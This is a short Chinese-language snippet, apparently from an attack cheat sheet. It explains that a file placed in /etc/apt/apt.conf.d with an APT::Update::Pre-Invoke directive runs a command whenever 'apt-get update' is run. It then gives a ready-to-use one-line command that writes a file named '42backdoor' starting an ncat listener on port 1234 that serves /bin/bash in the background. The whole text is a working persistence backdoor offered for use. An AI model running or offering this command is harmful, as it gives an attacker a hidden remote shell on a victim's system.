	如果您可以使用以下命令在apt.conf.d目录中创建一个文件：APT::Update::Pre-Invoke {"CMD"}; 下次"apt-get update"完成时，CMD 将被执行！

	echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor